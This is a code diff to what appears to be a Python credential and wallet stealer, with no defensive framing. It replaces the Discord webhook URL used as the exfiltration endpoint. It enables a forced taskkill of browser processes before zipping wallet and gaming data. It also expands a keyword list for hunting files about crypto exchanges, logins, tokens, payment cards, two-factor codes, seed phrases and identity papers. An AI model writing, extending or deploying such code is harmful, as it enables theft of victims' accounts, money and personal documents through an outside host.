@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "https://discordapp.com/api/webhooks/1036764824337657857/sMTHYvESCmaAQgG5kYgxKlYCKgxCUQ1rncCFctVBwcnYFkeJpZaBb2ug4EvuXk9HyLVp"
+hook = "https://discordapp.com/api/webhooks/1036332350080032809/t55kAGYPt7Y0q5hEP61CDDVPYWaZ1ieMy1MyKQR5UWigwVzAMY4HB97Ibh4_4up2Z5Qs"
 DETECTED = False
 
 
@@ -702,7 +702,7 @@ def ZipThings(path, arg, procc):
         name = arg
         global WalletsZip, GamingZip, OtherZip
         # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
-        # os.system(f"taskkill /im {procc} /t /f")
+        os.system(f"taskkill /im {procc} /t /f")
 
         if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
             browser = path.split("\\")[4].split("/")[1].replace(' ', '')
@@ -915,7 +915,35 @@ def Kiwi():
             "backup",
             "secret",
             "mnemonic",
-            "clef"
+            "clef",
+            "coinbase",
+            "binance",
+            "login",
+            "minecraft",
+            "netflix",
+            "spotify",
+            "brazzers",
+            "debouncer",
+            "card",
+            "allo",
+            "dorks",
+            "dork",
+            "dump",
+            "combo",
+            "rep",
+            "checker"
+            "data",
+            "numero",
+            "trading",
+            "NL",
+            "Discord",
+            "token",
+            "a2f",
+            "telephone",
+            "papier",
+            "justificatif",
+            "tout",
+            "phrase"
             ]
 
         wikith = []
